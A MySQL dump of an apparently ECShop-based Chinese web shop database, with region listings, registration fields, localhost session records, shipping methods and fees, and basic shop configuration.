INSERT INTO `ec22703249_region` VALUES ('3252', '385', '平湖市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3253', '385', '桐乡市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3254', '385', '海盐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3255', '386', '婺城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3256', '386', '金东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3257', '386', '兰溪市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3258', '386', '市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3259', '386', '佛堂镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3260', '386', '上溪镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3261', '386', '义亭镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3262', '386', '大陈镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3263', '386', '苏溪镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3264', '386', '赤岸镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3265', '386', '东阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3266', '386', '永康市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3267', '386', '武义县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3268', '386', '浦江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3269', '386', '磐安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3270', '387', '莲都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3271', '387', '龙泉市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3272', '387', '青田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3273', '387', '缙云县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3274', '387', '遂昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3275', '387', '松阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3276', '387', '云和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3277', '387', '庆元县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3278', '387', '景宁', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3279', '388', '海曙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3280', '388', '江东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3281', '388', '江北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3282', '388', '镇海区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3283', '388', '北仑区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3284', '388', '鄞州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3285', '388', '余姚市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3286', '388', '慈溪市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3287', '388', '奉化市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3288', '388', '象山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3289', '388', '宁海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3290', '389', '越城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3291', '389', '上虞市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3292', '389', '嵊州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3293', '389', '绍兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3294', '389', '新昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3295', '389', '诸暨市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3296', '390', '椒江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3297', '390', '黄岩区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3298', '390', '路桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3299', '390', '温岭市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3300', '390', '临海市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3301', '390', '玉环县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3302', '390', '三门县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3303', '390', '天台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3304', '390', '仙居县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3305', '391', '鹿城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3306', '391', '龙湾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3307', '391', '瓯海区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3308', '391', '瑞安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3309', '391', '乐清市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3310', '391', '洞头县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3311', '391', '永嘉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3312', '391', '平阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3313', '391', '苍南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3314', '391', '文成县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3315', '391', '泰顺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3316', '392', '定海区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3317', '392', '普陀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3318', '392', '岱山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3319', '392', '嵊泗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3320', '393', '衢州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3321', '393', '江山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3322', '393', '常山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3323', '393', '开化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3324', '393', '龙游县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3325', '394', '合川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3326', '394', '江津区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3327', '394', '南川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3328', '394', '永川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3329', '394', '南岸区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3330', '394', '渝北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3331', '394', '万盛区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3332', '394', '大渡口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3333', '394', '万州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3334', '394', '北碚区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3335', '394', '沙坪坝区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3336', '394', '巴南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3337', '394', '涪陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3338', '394', '江北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3339', '394', '九龙坡区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3340', '394', '渝中区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3341', '394', '黔江开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3342', '394', '长寿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3343', '394', '双桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3344', '394', '綦江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3345', '394', '潼南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3346', '394', '铜梁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3347', '394', '大足县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3348', '394', '荣昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3349', '394', '璧山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3350', '394', '垫江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3351', '394', '武隆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3352', '394', '丰都县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3353', '394', '城口县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3354', '394', '梁平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3355', '394', '开县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3356', '394', '巫溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3357', '394', '巫山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3358', '394', '奉节县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3359', '394', '云阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3360', '394', '忠县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3361', '394', '石柱', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3362', '394', '彭水', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3363', '394', '酉阳', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3364', '394', '秀山', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3365', '395', '沙田区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3366', '395', '东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3367', '395', '观塘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3368', '395', '黄大仙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3369', '395', '九龙城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3370', '395', '屯门区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3371', '395', '葵青区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3372', '395', '元朗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3373', '395', '深水埗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3374', '395', '西贡区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3375', '395', '大埔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3376', '395', '湾仔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3377', '395', '油尖旺区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3378', '395', '北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3379', '395', '南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3380', '395', '荃湾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3381', '395', '中西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3382', '395', '离岛区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3383', '396', '澳门', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3384', '397', '台北', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3385', '397', '高雄', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3386', '397', '基隆', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3387', '397', '台中', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3388', '397', '台南', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3389', '397', '新竹', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3390', '397', '嘉义', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3391', '397', '宜兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3392', '397', '桃园县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3393', '397', '苗栗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3394', '397', '彰化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3395', '397', '南投县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3396', '397', '云林县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3397', '397', '屏东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3398', '397', '台东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3399', '397', '花莲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3400', '397', '澎湖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3401', '3', '合肥', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('3402', '3401', '庐阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3403', '3401', '瑶海区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3404', '3401', '蜀山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3405', '3401', '包河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3406', '3401', '长丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3407', '3401', '肥东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3408', '3401', '肥西县', '3', '0');

-- ----------------------------
-- Table structure for `ec22703249_reg_extend_info`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_reg_extend_info`;
CREATE TABLE `ec22703249_reg_extend_info` (
  `Id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL,
  `reg_field_id` int(10) unsigned NOT NULL,
  `content` text NOT NULL,
  PRIMARY KEY (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_reg_extend_info
-- ----------------------------
INSERT INTO `ec22703249_reg_extend_info` VALUES ('1', '17', '7', '12');
INSERT INTO `ec22703249_reg_extend_info` VALUES ('2', '17', '9', '1');
INSERT INTO `ec22703249_reg_extend_info` VALUES ('3', '17', '10', '1');
INSERT INTO `ec22703249_reg_extend_info` VALUES ('4', '18', '7', '');
INSERT INTO `ec22703249_reg_extend_info` VALUES ('5', '18', '9', '2');
INSERT INTO `ec22703249_reg_extend_info` VALUES ('6', '18', '10', '2');
INSERT INTO `ec22703249_reg_extend_info` VALUES ('7', '19', '9', '1');
INSERT INTO `ec22703249_reg_extend_info` VALUES ('8', '19', '10', '1');
INSERT INTO `ec22703249_reg_extend_info` VALUES ('9', '19', '7', '');

-- ----------------------------
-- Table structure for `ec22703249_reg_fields`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_reg_fields`;
CREATE TABLE `ec22703249_reg_fields` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `reg_field_name` varchar(60) NOT NULL,
  `dis_order` tinyint(3) unsigned NOT NULL DEFAULT '100',
  `display` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_need` tinyint(1) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_reg_fields
-- ----------------------------
INSERT INTO `ec22703249_reg_fields` VALUES ('1', '姓名', '1', '1', '1', '1');
INSERT INTO `ec22703249_reg_fields` VALUES ('2', '邮编', '5', '1', '1', '1');
INSERT INTO `ec22703249_reg_fields` VALUES ('3', '住址', '2', '1', '1', '1');
INSERT INTO `ec22703249_reg_fields` VALUES ('4', '身份证号', '6', '1', '1', '0');
INSERT INTO `ec22703249_reg_fields` VALUES ('5', '手机', '4', '1', '1', '1');
INSERT INTO `ec22703249_reg_fields` VALUES ('6', '密码找回问题', '0', '0', '1', '0');
INSERT INTO `ec22703249_reg_fields` VALUES ('7', '家庭人数', '9', '1', '0', '0');
INSERT INTO `ec22703249_reg_fields` VALUES ('9', '是否有老人', '10', '1', '0', '0');
INSERT INTO `ec22703249_reg_fields` VALUES ('10', '是否有小孩', '11', '1', '0', '0');

-- ----------------------------
-- Table structure for `ec22703249_role`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_role`;
CREATE TABLE `ec22703249_role` (
  `role_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `role_name` varchar(60) NOT NULL DEFAULT '',
  `action_list` text NOT NULL,
  `role_describe` text,
  PRIMARY KEY (`role_id`),
  KEY `user_name` (`role_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_role
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_searchengine`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_searchengine`;
CREATE TABLE `ec22703249_searchengine` (
  `date` date NOT NULL DEFAULT '0000-00-00',
  `searchengine` varchar(20) NOT NULL DEFAULT '',
  `count` mediumint(8) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`date`,`searchengine`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_searchengine
-- ----------------------------
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-03', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-04', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-05', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-06', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-09', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-12', 'BAIDU', '1');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-13', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-14', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-15', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-16', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-17', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-18', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-19', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-20', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-21', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-22', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-23', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-24', 'BAIDU', '2');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-04-26', 'GOOGLE', '4');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-01', 'GOOGLE', '612');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-02', 'GOOGLE', '118');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-03', 'GOOGLE', '19');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-04', 'GOOGLE', '47');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-05', 'GOOGLE', '38');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-06', 'GOOGLE', '22');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-07', 'GOOGLE', '8');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-09', 'GOOGLE', '18');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-10', 'GOOGLE', '21');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-11', 'GOOGLE', '17');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-12', 'GOOGLE', '21');
INSERT INTO `ec22703249_searchengine` VALUES ('2014-08-13', 'GOOGLE', '23');

-- ----------------------------
-- Table structure for `ec22703249_sessions`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_sessions`;
CREATE TABLE `ec22703249_sessions` (
  `sesskey` char(32) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `expiry` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `adminid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ip` char(15) NOT NULL DEFAULT '',
  `user_name` varchar(60) NOT NULL,
  `user_rank` tinyint(3) NOT NULL,
  `discount` decimal(3,2) NOT NULL,
  `email` varchar(60) NOT NULL,
  `data` char(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`sesskey`),
  KEY `expiry` (`expiry`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_sessions
-- ----------------------------
INSERT INTO `ec22703249_sessions` VALUES ('eb50ec63911486961c10c3f398a582f1', '1408333877', '0', '0', '127.0.0.1', '0', '0', '1.00', '0', 'a:3:{s:7:\"from_ad\";i:0;s:7:\"referer\";s:6:\"本站\";s:10:\"login_fail\";i:0;}');
INSERT INTO `ec22703249_sessions` VALUES ('45195046c23cf80f2449a136fd952a6a', '1408334044', '17', '0', '127.0.0.1', 'hellotiger', '1', '1.00', '1111111@qq.com', 'a:7:{s:7:\"from_ad\";i:0;s:7:\"referer\";s:6:\"本站\";s:10:\"login_fail\";i:0;s:9:\"last_time\";s:10:\"1408287287\";s:7:\"last_ip\";s:9:\"127.0.0.1\";s:12:\"captcha_word\";s:16:\"ZTc5NzQwOTMwMQ==\";s:7:\"ucardno\";s:5:\"00998\";}');
INSERT INTO `ec22703249_sessions` VALUES ('a5a97adfd6a78c5398f9d6632b7a75fc', '1408334102', '0', '1', '127.0.0.1', '0', '0', '0.00', '0', 'a:3:{s:10:\"admin_name\";s:5:\"admin\";s:11:\"action_list\";s:3:\"all\";s:10:\"last_check\";i:1408333904;}');

-- ----------------------------
-- Table structure for `ec22703249_sessions_data`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_sessions_data`;
CREATE TABLE `ec22703249_sessions_data` (
  `sesskey` varchar(32) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `expiry` int(10) unsigned NOT NULL DEFAULT '0',
  `data` longtext NOT NULL,
  PRIMARY KEY (`sesskey`),
  KEY `expiry` (`expiry`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_sessions_data
-- ----------------------------
INSERT INTO `ec22703249_sessions_data` VALUES ('c97805a667c521d637931919b4e7689d', '2816490708', 'a:8:{s:7:\"from_ad\";i:0;s:7:\"referer\";s:6:\"本站\";s:10:\"login_fail\";i:0;s:9:\"last_time\";i:1408243099;s:7:\"last_ip\";s:0:\"\";s:12:\"captcha_word\";s:16:\"YTU2MWMxODQzMA==\";s:10:\"flow_order\";a:1:{s:14:\"extension_code\";s:0:\"\";}s:14:\"flow_consignee\";a:14:{s:10:\"address_id\";i:0;s:9:\"consignee\";s:0:\"\";s:7:\"country\";s:0:\"\";s:8:\"province\";s:0:\"\";s:4:\"city\";s:0:\"\";s:8:\"district\";s:0:\"\";s:5:\"email\";s:0:\"\";s:7:\"address\";s:0:\"\";s:7:\"zipcode\";s:0:\"\";s:3:\"tel\";s:0:\"\";s:6:\"mobile\";s:0:\"\";s:13:\"sign_building\";s:0:\"\";s:9:\"best_time\";s:0:\"\";s:7:\"user_id\";s:2:\"18\";}}');

-- ----------------------------
-- Table structure for `ec22703249_shipping`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_shipping`;
CREATE TABLE `ec22703249_shipping` (
  `shipping_id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `shipping_code` varchar(20) NOT NULL DEFAULT '',
  `shipping_name` varchar(120) NOT NULL DEFAULT '',
  `shipping_desc` varchar(255) NOT NULL DEFAULT '',
  `insure` varchar(10) NOT NULL DEFAULT '0',
  `support_cod` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `enabled` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `shipping_print` text NOT NULL,
  `print_bg` varchar(255) DEFAULT NULL,
  `config_lable` text,
  `print_model` tinyint(1) DEFAULT '0',
  `shipping_order` tinyint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`shipping_id`),
  KEY `shipping_code` (`shipping_code`,`enabled`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_shipping
-- ----------------------------
INSERT INTO `ec22703249_shipping` VALUES ('1', 'cac', '上门取货', '买家自己到商家指定地点取货', '0', '1', '1', '', '', '', '2', '0');
INSERT INTO `ec22703249_shipping` VALUES ('2', 'sto_express', '申通快递', '江、浙、沪地区首重为15元/KG，其他地区18元/KG， 续重均为5-6元/KG， 云南地区为8元', '0', '0', '1', '', '/images/receipt/dly_sto_express.jpg', 't_shop_address,网店-地址,235,48,131,152,b_shop_address||,||t_shop_name,网店-名称,237,26,131,200,b_shop_name||,||t_shop_tel,网店-联系电话,96,36,144,257,b_shop_tel||,||t_customer_post,收件人-邮编,86,23,578,268,b_customer_post||,||t_customer_address,收件人-详细地址,232,49,434,149,b_customer_address||,||t_customer_name,收件人-姓名,151,27,449,231,b_customer_name||,||t_customer_tel,收件人-电话,90,32,452,261,b_customer_tel||,||', '2', '0');
INSERT INTO `ec22703249_shipping` VALUES ('3', 'sf_express', '顺丰速运', '江、浙、沪地区首重15元/KG，续重2元/KG，其余城市首重20元/KG', '0', '0', '1', '', '/images/receipt/dly_sf_express.jpg', 't_shop_name,网店-名称,150,29,112,137,b_shop_name||,||t_shop_address,网店-地址,268,55,105,168,b_shop_address||,||t_shop_tel,网店-联系电话,55,25,177,224,b_shop_tel||,||t_customer_name,收件人-姓名,78,23,299,265,b_customer_name||,||t_customer_address,收件人-详细地址,271,94,104,293,b_customer_address||,||', '2', '0');

-- ----------------------------
-- Table structure for `ec22703249_shipping_area`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_shipping_area`;
CREATE TABLE `ec22703249_shipping_area` (
  `shipping_area_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `shipping_area_name` varchar(150) NOT NULL DEFAULT '',
  `shipping_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `configure` text NOT NULL,
  PRIMARY KEY (`shipping_area_id`),
  KEY `shipping_id` (`shipping_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_shipping_area
-- ----------------------------
INSERT INTO `ec22703249_shipping_area` VALUES ('1', '大陆地区', '1', 'a:3:{i:0;a:2:{s:4:\"name\";s:10:\"free_money\";s:5:\"value\";s:0:\"\";}i:1;a:2:{s:4:\"name\";s:16:\"fee_compute_mode\";s:5:\"value\";s:0:\"\";}i:2;a:2:{s:4:\"name\";s:7:\"pay_fee\";s:5:\"value\";s:0:\"\";}}');
INSERT INTO `ec22703249_shipping_area` VALUES ('2', '大陆地区', '2', 'a:5:{i:0;a:2:{s:4:\"name\";s:8:\"item_fee\";s:5:\"value\";s:2:\"15\";}i:1;a:2:{s:4:\"name\";s:8:\"base_fee\";s:5:\"value\";s:2:\"15\";}i:2;a:2:{s:4:\"name\";s:8:\"step_fee\";s:5:\"value\";s:1:\"5\";}i:3;a:2:{s:4:\"name\";s:10:\"free_money\";s:5:\"value\";s:0:\"\";}i:4;a:2:{s:4:\"name\";s:16:\"fee_compute_mode\";s:5:\"value\";s:9:\"by_weight\";}}');
INSERT INTO `ec22703249_shipping_area` VALUES ('3', '大陆地区', '3', 'a:5:{i:0;a:2:{s:4:\"name\";s:8:\"item_fee\";s:5:\"value\";s:2:\"20\";}i:1;a:2:{s:4:\"name\";s:8:\"base_fee\";s:5:\"value\";s:2:\"15\";}i:2;a:2:{s:4:\"name\";s:8:\"step_fee\";s:5:\"value\";s:1:\"2\";}i:3;a:2:{s:4:\"name\";s:10:\"free_money\";s:5:\"value\";s:0:\"\";}i:4;a:2:{s:4:\"name\";s:16:\"fee_compute_mode\";s:5:\"value\";s:9:\"by_weight\";}}');

-- ----------------------------
-- Table structure for `ec22703249_shop_config`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_shop_config`;
CREATE TABLE `ec22703249_shop_config` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `code` varchar(30) NOT NULL DEFAULT '',
  `type` varchar(10) NOT NULL DEFAULT '',
  `store_range` varchar(255) NOT NULL DEFAULT '',
  `store_dir` varchar(255) NOT NULL DEFAULT '',
  `value` text NOT NULL,
  `sort_order` tinyint(3) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  UNIQUE KEY `code` (`code`),
  KEY `parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=904 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_shop_config
-- ----------------------------
INSERT INTO `ec22703249_shop_config` VALUES ('1', '0', 'shop_info', 'group', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('2', '0', 'basic', 'group', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('3', '0', 'display', 'group', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('4', '0', 'shopping_flow', 'group', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('5', '0', 'smtp', 'group', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('6', '0', 'hidden', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('7', '0', 'goods', 'group', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('8', '0', 'sms', 'group', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('9', '0', 'wap', 'group', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('101', '1', 'shop_name', 'text', '', '', '君禾园', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('102', '1', 'shop_title', 'text', '', '', '君禾园', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('103', '1', 'shop_desc', 'text', '', '', '君禾园', '1');
